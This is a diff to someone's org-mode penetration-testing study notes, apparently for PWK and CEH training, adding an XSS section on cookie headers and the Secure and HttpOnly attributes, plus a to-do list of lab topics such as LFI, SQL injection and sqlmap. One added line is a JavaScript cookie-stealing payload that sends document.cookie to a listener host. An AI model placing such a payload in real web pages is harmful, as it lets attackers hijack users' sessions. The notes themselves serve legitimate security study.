@@ -9,6 +9,48 @@
 + CEH v9 gitbook?
   XSS Exploits cgisecurity.com
 
+* Book3_Chapter 0 XSS
+** self-xss
+   + ref:
+     - PWK p305
+     - [[https://en.wikipedia.org/wiki/Secure_cookie][wiki, Secure cookie]]
+     - [[https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies][MDN, Secure and HttpOnly cookie]]
+     - [[https://stackoverflow.com/questions/15198231/why-cookies-and-set-cookie-headers-cant-be-set-while-making-xmlhttprequest-usin][XmlHttpRequest does not support cookie]]
+  
+   + info:
+   #+begin_quote
+   The Set-Cookie HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:
+   #+end_quote
+
+   + src (server -> browser):
+   #+begin_src http
+   HTTP/2.0 200 OK
+   Content-Type: text/html
+   Set-Cookie: yummy_cookie=choco
+   Set-Cookie: tasty_cookie=strawberry
+   
+   [page content]
+   #+end_src
+
+   + src (browser -> server):
+   #+begin_src http
+   GET /sample_page.html HTTP/2.0
+   Host: www.example.org
+   Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+   #+end_src
+
+   + src (secure attribute):
+   #+begin_src http
+   Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
+     # Secure: only over https;
+     # HttpOnly: not accessible by JavaScript (document.cookie)
+   #+end_src
+
+   + src:
+   #+begin_src javascript
+   new Image().src=`http://127.0.0.1/${document.cookie}`
+   #+end_src
+
 * Book3_Chapter 02-05 the basics
 *** the linux filesystem hierachy standard(FHS)
    + /bin - basic programs (ls, cd, cat, etc.)
@@ -5120,8 +5162,15 @@ ipython
 
 ** TODO list
   + (Burp setup, test in box)
+  + (Nikto p274, test)
   + *Exploiting Admin Consoles, XSS, LFI && (RFI), DirTraversal, test in box*
-  + *SQL (cp9.4 revisit)*
+  (p275-321)
+  7th lfi, 8-9th sql
+  beef? allow/not
+
+  p306 - self xss -> src -> nc
+
+  + *SQL (cp9.4 revisit p321)*
   + *sqlmap, test in box*
   + *post enumeration scripts (linux, windows, try in box)*
   + privilege escalation methods (linux)
